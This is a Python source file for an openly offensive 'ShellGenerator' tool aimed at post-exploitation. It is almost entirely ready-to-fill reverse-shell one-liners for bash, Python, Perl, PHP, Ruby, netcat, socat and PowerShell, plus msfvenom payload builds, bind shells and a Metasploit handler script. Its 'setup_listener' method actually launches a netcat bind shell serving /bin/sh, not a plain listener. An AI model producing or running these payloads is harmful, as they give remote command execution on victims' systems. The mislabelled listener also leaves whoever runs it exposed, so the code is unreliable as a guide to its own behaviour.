"""Shell Generator - Auto-generate reverse shells for post-exploitation."""

import asyncio
from typing import Optional


class ShellGenerator:
    """Generate reverse shells, bind shells, and payloads."""

    REVERSE_SHELLS = {
        "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "python": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "perl": "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}};'",
        "php": "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "nc": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "ncat": "ncat {lhost} {lport} -e /bin/sh",
        "socat": "socat TCP:{lhost}:{lport} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
        "powershell": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        "msfvenom_linux": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o /tmp/shell.elf",
        "msfvenom_windows": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o /tmp/shell.exe",
        "msfvenom_web": "msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o /tmp/shell.php",
    }

    BIND_SHELLS = {
        "nc": "nc -lvp {lport} -e /bin/sh",
        "socat": "socat TCP-LISTEN:{lport},fork EXEC:/bin/sh",
    }

    def generate_reverse_shell(self, shell_type: str, lhost: str, lport: int) -> str:
        """Generate a reverse shell payload."""
        template = self.REVERSE_SHELLS.get(shell_type)
        if not template:
            return f"Unknown shell type: {shell_type}. Available: {', '.join(self.REVERSE_SHELLS.keys())}"
        return template.format(lhost=lhost, lport=lport)

    def generate_bind_shell(self, shell_type: str, lport: int) -> str:
        """Generate a bind shell payload."""
        template = self.BIND_SHELLS.get(shell_type)
        if not template:
            return f"Unknown shell type: {shell_type}"
        return template.format(lport=lport)

    def generate_all_reverse(self, lhost: str, lport: int) -> dict:
        """Generate all types of reverse shells."""
        shells = {}
        for shell_type in self.REVERSE_SHELLS:
            shells[shell_type] = self.generate_reverse_shell(shell_type, lhost, lport)
        return shells

    async def setup_listener(self, lport: int, lhost: str = "0.0.0.0") -> asyncio.subprocess.Process:
        """Start a netcat listener."""
        cmd = f"nc -lvp {lport} -e /bin/sh"
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        return proc

    async def setup_msfconsole(self, exploit: str, lhost: str, lport: int) -> str:
        """Generate msfconsole resource script."""
        resource = f"""use exploit/multi/handler
set PAYLOAD {exploit}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
"""
        return resource
